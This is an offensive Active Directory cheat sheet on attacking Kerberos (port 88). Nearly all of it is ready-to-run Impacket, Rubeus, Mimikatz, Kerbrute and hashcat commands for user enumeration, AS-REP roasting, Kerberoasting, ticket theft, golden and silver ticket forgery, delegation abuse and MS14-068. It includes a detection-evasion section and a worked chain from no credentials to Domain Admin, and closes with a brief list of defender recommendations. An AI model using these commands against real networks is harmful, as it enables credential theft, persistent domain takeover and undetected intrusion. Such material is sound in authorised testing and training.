# Port 88 - Kerberos - Complete Attack Guide

## Overview

**Protocol**: Kerberos Authentication
**Port**: 88 (TCP/UDP)
**Transport**: Both TCP and UDP
**Encryption**: RC4, AES128, AES256
**Purpose**: Network authentication protocol for Active Directory

## Attack Objectives

- **Kerberoasting**: Extract and crack service account passwords
- **AS-REP Roasting**: Attack accounts without Kerberos pre-authentication
- **Golden Ticket**: Forge TGT (Ticket Granting Ticket)
- **Silver Ticket**: Forge service tickets
- **Pass-the-Ticket**: Use stolen Kerberos tickets
- **Overpass-the-Hash**: Use NTLM hash to get Kerberos ticket
- **Delegation Abuse**: Exploit unconstrained/constrained delegation
- **MS14-068**: Domain privilege escalation

## Attack Methodology

### Phase 1: Discovery and Reconnaissance

**1.1 Detect Kerberos Service**
```bash
# Quick scan
nmap -p 88 192.168.1.100

# TCP and UDP
nmap -sT -sU -p 88 192.168.1.100

# Service version
nmap -p 88 -sV 192.168.1.100

# Network-wide DC discovery
nmap -p 88,389,636 192.168.1.0/24 --open
```

**1.2 Enumerate Domain Information**
```bash
# Using Nmap
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='CORP.LOCAL' 192.168.1.100

# Get domain name
nslookup -type=srv _kerberos._tcp.dc._msdcs.CORP.LOCAL

# Using kerbrute (no credentials needed!)
kerbrute userenum -d corp.local --dc 192.168.1.100 users.txt

# Enumerate valid usernames
kerbrute userenum -d corp.local --dc 192.168.1.100 /usr/share/seclists/Usernames/Names/names.txt
```

**1.3 Check Kerberos Pre-Authentication**
```bash
# Test if user requires pre-auth
# Using Impacket GetNPUsers
GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 192.168.1.100 -no-pass

# If successful, returns AS-REP hash (roastable!)
```

### Phase 2: AS-REP Roasting (No Credentials Needed!)

**2.1 Enumerate Roastable Users**
```bash
# Find users without Kerberos pre-auth required
# Using LDAP (if you have creds)
ldapsearch -x -h 192.168.1.100 -D "corp\user" -w password -b "DC=corp,DC=local" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName

# Using PowerView (Windows)
Get-DomainUser -PreauthNotRequired -Properties samaccountname

# Using Impacket (Linux - no creds!)
GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 192.168.1.100 -no-pass -format hashcat
```

**2.2 Request AS-REP Hash**
```bash
# Get AS-REP hashes (Kerberos response)
GetNPUsers.py corp.local/ -usersfile roastable_users.txt -dc-ip 192.168.1.100 -no-pass -outputfile asrep_hashes.txt

# Or for specific user
GetNPUsers.py corp.local/vulnerable_user -dc-ip 192.168.1.100 -no-pass

# Using Rubeus (Windows)
Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt
```

**2.3 Crack AS-REP Hashes**
```bash
# Using hashcat
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 18200 asrep_hashes.txt rockyou.txt -r rules/best64.rule

# Using John the Ripper
john --wordlist=rockyou.txt asrep_hashes.txt
```

### Phase 3: Kerberoasting (Credentials Required)

**3.1 Enumerate Service Accounts with SPNs**
```bash
# Using Impacket GetUserSPNs
GetUserSPNs.py corp.local/user:password -dc-ip 192.168.1.100

# List all SPNs
GetUserSPNs.py corp.local/user:password -dc-ip 192.168.1.100 -request

# Save to file
GetUserSPNs.py corp.local/user:password -dc-ip 192.168.1.100 -request -outputfile kerberoast_hashes.txt

# Using PowerView (Windows)
Get-DomainUser -SPN | select samaccountname,serviceprincipalname

# Using setspn (Windows - on DC)
setspn -Q */*
```

**3.2 Request TGS (Service Tickets)**
```bash
# Request all service tickets
GetUserSPNs.py corp.local/user:password -dc-ip 192.168.1.100 -request -outputfile tgs.txt

# Target specific SPN
GetUserSPNs.py corp.local/user:password -dc-ip 192.168.1.100 -request-user sqlservice

# Using Rubeus (Windows)
Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt

# Targeted kerberoasting
Rubeus.exe kerberoast /user:sqlservice /outfile:sqlservice_hash.txt
```

**3.3 Crack Kerberoast Hashes**
```bash
# Using hashcat (TGS-REP)
hashcat -m 13100 kerberoast_hashes.txt rockyou.txt

# With rules for better cracking
hashcat -m 13100 kerberoast_hashes.txt rockyou.txt -r rules/best64.rule

# Using John
john --wordlist=rockyou.txt kerberoast_hashes.txt

# Identify weak hashes first (RC4 vs AES)
# RC4 hashes are weaker and easier to crack
```

### Phase 4: Pass-the-Ticket (PTT)

**4.1 Extract Kerberos Tickets**
```bash
# Using Mimikatz (Windows - requires admin)
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export

# Using Rubeus
Rubeus.exe dump /service:krbtgt /nowrap

# Extract from memory
Rubeus.exe triage

# Using Impacket (Linux)
# First, get ticket with credentials
getTGT.py corp.local/user:password
# Ticket saved as user.ccache
```

**4.2 Import and Use Tickets**
```bash
# Linux - Set KRB5CCNAME
export KRB5CCNAME=/path/to/ticket.ccache

# Verify ticket
klist

# Use ticket with Impacket tools
psexec.py -k -no-pass corp.local/administrator@target.corp.local

# Windows - Import with Rubeus
Rubeus.exe ptt /ticket:base64_ticket

# Windows - Import with Mimikatz
mimikatz # kerberos::ptt ticket.kirbi

# Use ticket
dir \\dc\c$
```

### Phase 5: Overpass-the-Hash (Pass-the-Key)

**5.1 Use NTLM Hash to Get Kerberos Ticket**
```bash
# Using Impacket getTGT
getTGT.py corp.local/administrator -hashes :NTLM_HASH

# Export ticket
export KRB5CCNAME=administrator.ccache

# Use ticket
psexec.py -k -no-pass administrator@target.corp.local

# Using Rubeus (Windows)
Rubeus.exe asktgt /user:administrator /rc4:NTLM_HASH /domain:corp.local /ptt

# Now you have Kerberos ticket from just NTLM hash!
```

### Phase 6: Golden Ticket Attack

**6.1 Requirements**
```bash
# Need:
# - krbtgt NTLM hash (from DCSync or domain compromise)
# - Domain SID
# - Domain name

# Get krbtgt hash using Mimikatz (if DA)
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt

# Get domain SID
whoami /user
# Or using PowerShell
Get-ADDomain | select DomainSID
```

**6.2 Create Golden Ticket**
```bash
# Using Mimikatz (Windows)
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:NTLM_HASH /ptt

# Using Impacket (Linux)
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain corp.local Administrator

# Import ticket
export KRB5CCNAME=Administrator.ccache

# Access any resource
psexec.py -k -no-pass administrator@dc.corp.local
```

**6.3 Golden Ticket Persistence**
```bash
# Create ticket with long lifetime (10 years)
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain corp.local -duration 3650 Administrator

# Create for any user (even non-existent)
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain corp.local FakeAdmin

# Full domain control!
```

### Phase 7: Silver Ticket Attack

**7.1 Requirements**
```bash
# Need:
# - Service account NTLM hash
# - Service SPN
# - Domain SID
# - Target hostname

# Get service account hash
# From Kerberoasting or credential dump
```

**7.2 Create Silver Ticket**
```bash
# For CIFS service (file access)
ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain corp.local -spn cifs/target.corp.local Administrator

# For HTTP service
ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain corp.local -spn http/webapp.corp.local Administrator

# For MSSQL service
ticketer.py -nthash MSSQL_HASH -domain-sid S-1-5-21-... -domain corp.local -spn MSSQLSvc/sql.corp.local:1433 Administrator

# Use ticket
export KRB5CCNAME=Administrator.ccache
smbclient.py -k -no-pass corp.local/administrator@target.corp.local
```

### Phase 8: Delegation Attacks

**8.1 Unconstrained Delegation**
```bash
# Find computers with unconstrained delegation
# Using PowerView
Get-DomainComputer -Unconstrained | select samaccountname

# Using LDAP
ldapsearch -x -h 192.168.1.100 -D "user" -w "pass" -b "DC=corp,DC=local" "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" dNSHostName

# Compromise computer with unconstrained delegation
# Then extract tickets from memory when admin connects
Rubeus.exe monitor /interval:5

# When DA connects, steal their TGT!
```

**8.2 Constrained Delegation**
```bash
# Find accounts with constrained delegation
Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto

# Abuse S4U2Self and S4U2Proxy
# Using Rubeus
Rubeus.exe s4u /user:serviceaccount /rc4:NTLM_HASH /impersonateuser:Administrator /msdsspn:cifs/target.corp.local /ptt

# Using Impacket
getST.py -spn cifs/target.corp.local -impersonate Administrator corp.local/serviceaccount:password
```

**8.3 Resource-Based Constrained Delegation (RBCD)**
```bash
# If you can write msDS-AllowedToActOnBehalfOfOtherIdentity
# Create computer account
addcomputer.py -computer-name 'EVILCOMPUTER$' -computer-pass 'Password123!' -dc-ip 192.168.1.100 corp.local/user:password

# Modify target's RBCD property
rbcd.py -delegate-from 'EVILCOMPUTER$' -delegate-to 'TARGET$' -action 'write' corp.local/user:password

# Get ticket
getST.py -spn cifs/target.corp.local -impersonate Administrator -dc-ip 192.168.1.100 corp.local/'EVILCOMPUTER$':'Password123!'

# Own the target!
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass administrator@target.corp.local
```

### Phase 9: MS14-068 (CVE-2014-6324)

**9.1 Exploit Kerberos Checksum Validation**
```bash
# Only works on unpatched DCs (rare now)
# Using PyKEK
python ms14-068.py -u user@corp.local -s S-1-5-21-...-1234 -d dc.corp.local -p password

# Generates forged TGT with Domain Admin privileges
# Import and use
export KRB5CCNAME=TGT_user@corp.local.ccache
psexec.py -k -no-pass administrator@dc.corp.local
```

## Bypass Techniques

### Bypassing AES Kerberoasting
```bash
# Request RC4 tickets (weaker, easier to crack)
Rubeus.exe kerberoast /tgtdeleg /rc4opsec

# Or downgrade to RC4
GetUserSPNs.py corp.local/user:password -dc-ip 192.168.1.100 -request -outputfile hashes.txt
```

### Bypassing Detection
```bash
# Opsec-safe kerberoasting
# Request only one ticket at a time
# Add delays between requests
# Use legitimate service accounts

# Avoid detection
# Don't request all SPNs at once
# Rotate source IPs if possible
```

## Information Extraction

**Critical Commands**:
```bash
# Enumerate users
kerbrute userenum -d corp.local --dc 192.168.1.100 users.txt

# Get SPNs
GetUserSPNs.py corp.local/user:password -dc-ip 192.168.1.100

# AS-REP roastable
GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 192.168.1.100 -no-pass

# Delegation
Get-DomainComputer -Unconstrained
Get-DomainUser -TrustedToAuth
```

## Security Recommendations

**For Defenders**:
1. **Strong Service Account Passwords** - 25+ characters
2. **Managed Service Accounts (gMSA)** - Auto-rotating passwords
3. **Require Pre-Authentication** - For all accounts
4. **Audit SPNs** - Remove unnecessary SPNs
5. **AES Encryption** - Disable RC4
6. **Monitor Kerberos Tickets** - Detect anomalies
7. **Limit Delegation** - Remove unconstrained delegation
8. **Patch MS14-068** - Critical!
9. **Protect krbtgt** - Reset password regularly
10. **Honey Accounts** - Detect Kerberoasting attempts

## Practical Attack Scenario

```bash
# Phase 1: Reconnaissance (NO CREDS)
kerbrute userenum -d corp.local --dc 192.168.1.100 /usr/share/seclists/Usernames/Names/names.txt
# Found 50 valid usernames

# Phase 2: AS-REP Roasting (NO CREDS)
GetNPUsers.py corp.local/ -usersfile valid_users.txt -dc-ip 192.168.1.100 -no-pass -format hashcat
# Found: john - AS-REP hash

# Phase 3: Crack hash
hashcat -m 18200 john_asrep.txt rockyou.txt
# Cracked: john:Password123

# Phase 4: Kerberoasting (WITH CREDS)
GetUserSPNs.py corp.local/john:Password123 -dc-ip 192.168.1.100 -request -outputfile tgs.txt
# Found 3 service accounts

# Phase 5: Crack service accounts
hashcat -m 13100 tgs.txt rockyou.txt
# Cracked: sqlservice:Summer2024

# Phase 6: Compromise SQL Server
psexec.py corp.local/sqlservice:Summer2024@sql.corp.local
# Local admin on SQL server!

# Phase 7: Extract credentials
mimikatz # sekurlsa::logonpasswords
# Found: da_account hash

# Phase 8: DCSync
secretsdump.py corp.local/da_account@dc.corp.local -hashes :HASH
# Got krbtgt hash!

# Phase 9: Golden Ticket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain corp.local Administrator

# Phase 10: Full domain control!
psexec.py -k -no-pass administrator@dc.corp.local
# Domain Admin!
```

## Tools Summary

**Best Tool for Each Task**:
- **User Enumeration**: Kerbrute
- **AS-REP Roasting**: GetNPUsers (Impacket)
- **Kerberoasting**: GetUserSPNs (Impacket), Rubeus
- **Ticket Manipulation**: Mimikatz, Rubeus
- **Golden/Silver Tickets**: Impacket ticketer, Mimikatz
- **Delegation**: PowerView, Rubeus

## Related Attacks

- **Port 389 (LDAP)**: Domain enumeration
- **Port 445 (SMB)**: Lateral movement with tickets
- **Port 135 (RPC)**: Remote execution
- **DCSync**: Extract krbtgt hash

---

**Last Updated**: 2026-06-16
